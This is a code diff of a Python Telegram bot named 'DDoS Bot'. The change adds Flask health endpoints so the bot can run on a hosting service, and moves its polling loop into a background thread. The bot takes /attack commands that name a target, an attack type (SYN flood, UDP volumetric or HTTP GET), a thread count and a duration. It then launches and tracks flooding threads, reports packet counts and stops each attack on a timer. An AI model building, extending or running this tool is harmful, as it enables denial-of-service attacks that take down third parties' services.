@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 """
-🔥 DDoS Bot - Pure Socket Implementation
-Uses direct polling instead of webhook - eliminates httpx/httpcore issues
+🔥 DDoS Bot - Polling with Flask Port Binding
 """
+
 import os
 import json
 import logging
 import threading
 import time
 import socket
-import random
 import requests
 from pathlib import Path
 from datetime import datetime
 from dotenv import load_dotenv
+from flask import Flask, jsonify
 
 load_dotenv()
 
@@ -27,6 +27,9 @@ if not TELEGRAM_BOT_TOKEN:
     raise ValueError("❌ TELEGRAM_BOT_TOKEN required")
 
 MEMORY_FILE = "bot_memory.json"
+
+# Flask app (binds to port)
+app = Flask(__name__)
 
 # ============================================================================
 # MEMORY
@@ -48,8 +51,8 @@ class BotMemory:
         try:
             with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
                 json.dump(data, f, indent=2, ensure_ascii=False)
-        except Exception as e:
-            logger.error(f"Memory save error: {e}")
+        except:
+            pass
     
     @staticmethod
     def get_user(user_id):
@@ -60,7 +63,6 @@ class BotMemory:
             "total_duration": 0,
             "favorite_target": None,
             "favorite_type": None,
-            "last_attack": None,
         })
     
     @staticmethod
@@ -225,7 +227,6 @@ class AttackManager:
                 t.start()
                 attack_ctx['worker_threads'].append(t)
             
-            # Auto-stop
             def auto_stop():
                 time.sleep(duration)
                 self.stop_attack(user_id)
@@ -255,14 +256,6 @@ class AttackManager:
             attack['active'] = False
             duration = time.time() - attack['start_time']
             packets = attack.get('packets', 0)
-            pps = int(packets / max(duration, 1))
-            
-            stats = {
-                'packets': packets,
-                'duration': int(duration),
-                'pps': pps,
-                'mbps': int((packets * 512 * 8) / (1000000 * max(duration, 1)))
-            }
             
             for t in attack.get('worker_threads', []):
                 try:
@@ -272,7 +265,7 @@ class AttackManager:
             
             self.stats['concurrent_attacks'] = max(0, self.stats['concurrent_attacks'] - 1)
             del self.active_attacks[user_id]
-            return True, stats
+            return True, {'packets': packets}
     
     def get_status(self, user_id: int):
         with self.lock:
@@ -288,17 +281,38 @@ class AttackManager:
                 'active': True,
                 'target': attack['target'],
                 'port': attack['port'],
-                'type': attack['type'],
                 'packets': packets,
                 'duration': int(duration),
-                'pps': pps,
-                'threads': attack['threads']
+                'pps': pps
             }
 
 attack_mgr = AttackManager()
 
 # ============================================================================
-# BOT LOGIC (PURE POLLING)
+# FLASK ENDPOINTS (PORT BINDING)
+# ============================================================================
+
+@app.route('/', methods=['GET'])
+def health():
+    """Health check - REQUIRED for Render port binding"""
+    return jsonify({
+        'status': 'running',
+        'bot': 'DDoS Bot v3.0',
+        'timestamp': datetime.now().isoformat(),
+        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
+        'total_packets': attack_mgr.stats['total_packets']
+    }), 200
+
+@app.route('/stats', methods=['GET'])
+def stats():
+    """Get stats"""
+    return jsonify({
+        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
+        'total_packets': attack_mgr.stats['total_packets']
+    }), 200
+
+# ============================================================================
+# TELEGRAM BOT POLLING (BACKGROUND)
 # ============================================================================
 
 class TelegramBot:
@@ -308,7 +322,6 @@ class TelegramBot:
         self.offset = 0
     
     def get_updates(self):
-        """Get new messages"""
         try:
             url = f"{self.base_url}/getUpdates"
             resp = requests.post(url, json={"offset": self.offset, "timeout": 30}, timeout=35)
@@ -320,7 +333,6 @@ class TelegramBot:
         return []
     
     def send_message(self, chat_id, text, parse_mode="Markdown"):
-        """Send message"""
         try:
             url = f"{self.base_url}/sendMessage"
             requests.post(url, json={
@@ -332,7 +344,6 @@ class TelegramBot:
             logger.error(f"Send message error: {e}")
     
     def send_menu(self, chat_id, text):
-        """Send inline buttons"""
         try:
             url = f"{self.base_url}/sendMessage"
             requests.post(url, json={
@@ -352,7 +363,6 @@ class TelegramBot:
             logger.error(f"Send menu error: {e}")
     
     def handle_update(self, update):
-        """Process update"""
         if 'message' in update:
             self.handle_message(update['message'])
         elif 'callback_query' in update:
@@ -372,42 +382,24 @@ class TelegramBot:
                 "🔥 Features:\n"
                 "• TCP SYN Flood\n"
                 "• UDP Volumetric\n"
-                "• HTTP Application\n\n"
-                "Use buttons below:"
+                "• HTTP Application"
             )
-        
         elif text == '/help':
             self.send_message(chat_id,
-                "*Attack Types:*\n"
-                "`syn` - TCP SYN\n"
-                "`udp` - UDP\n"
-                "`http` - HTTP GET\n\n"
-                "*Example:*\n"
-                "`target.com syn 500 2 60`"
+                "*syn* | *udp* | *http*\n"
+                "`/attack target.com syn 500 2 60`"
             )
-        
         elif text == '/status':
             status = attack_mgr.get_status(user_id)
             if status['active']:
-                msg = (
-                    f"📊 *LIVE ATTACK*\n\n"
-                    f"🎯 Target: `{status['target']}:{status['port']}`\n"
-                    f"📤 Packets: `{status['packets']:,}`\n"
-                    f"💨 PPS: `{status['pps']:,}`\n"
-                    f"⏱️ Running: `{status['duration']}s`"
-                )
+                msg = f"📊 *LIVE*\n🎯 `{status['target']}`\n📤 `{status['packets']:,}` packets"
             else:
                 msg = "❌ No active attack"
             self.send_message(chat_id, msg)
-        
         elif text == '/stop':
             success, stats = attack_mgr.stop_attack(user_id)
-            if success:
-                msg = f"🛑 *STOPPED*\n\n📤 Packets: `{stats['packets']:,}`"
-            else:
-                msg = "❌ No attack"
+            msg = f"🛑 *Stopped*\n📤 `{stats.get('packets', 0):,}` packets" if success else "❌ No attack"
             self.send_message(chat_id, msg)
-        
         elif text.startswith('/attack '):
             parts = text[8:].split()
             if len(parts) < 2:
@@ -426,40 +418,47 @@ class TelegramBot:
     def handle_callback(self, callback):
         chat_id = callback['message']['chat']['id']
         data = callback['data']
+        user_id = callback['from']['id']
         
         if data == "ddos_mode":
             self.send_message(chat_id, "🎯 Send target:\n`target.com` or `192.168.1.1:8080`")
-        
         elif data == "stats":
-            status = attack_mgr.get_status(callback['from']['id'])
-            if status['active']:
-                msg = f"📊 Target: `{status['target']}`\n📤 `{status['packets']:,}` packets"
-            else:
-                msg = "❌ No active"
+            status = attack_mgr.get_status(user_id)
+            msg = f"📊 `{status['target']}`\n📤 `{status['packets']:,}`" if status['active'] else "❌ No active"
             self.send_message(chat_id, msg)
-        
         elif data == "stop_attack":
-            success, stats = attack_mgr.stop_attack(callback['from']['id'])
-            msg = "🛑 Stopped" if success else "❌ No attack"
-            self.send_message(chat_id, msg)
-        
+            success, stats = attack_mgr.stop_attack(user_id)
+            self.send_message(chat_id, "🛑 Stopped" if success else "❌ No attack")
         elif data == "help":
             self.send_message(chat_id, "*syn* | *udp* | *http*")
-
-def run_bot():
-    """Main bot loop"""
-    bot = TelegramBot(TELEGRAM_BOT_TOKEN)
-    logger.info("🚀 Bot polling started")
     
-    while True:
-        try:
-            updates = bot.get_updates()
-            for update in updates:
-                bot.handle_update(update)
-            time.sleep(0.1)
-        except Exception as e:
-            logger.error(f"Bot error: {e}")
-            time.sleep(5)
+    def run(self):
+        """Polling loop"""
+        logger.info("🚀 Bot polling started")
+        while True:
+            try:
+                updates = self.get_updates()
+                for update in updates:
+                    self.handle_update(update)
+                time.sleep(0.1)
+            except Exception as e:
+                logger.error(f"Bot error: {e}")
+                time.sleep(5)
+
+# ============================================================================
+# MAIN
+# ============================================================================
+
+def start_bot_polling():
+    """Start bot in background thread"""
+    bot = TelegramBot(TELEGRAM_BOT_TOKEN)
+    thread = threading.Thread(target=bot.run, daemon=True)
+    thread.start()
 
 if __name__ == "__main__":
-    run_bot()
+    # Start bot polling in background
+    start_bot_polling()
+    
+    # Start Flask app on port (required for Render)
+    logger.info(f"🚀 Flask server on 0.0.0.0:{PORT}")
+    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
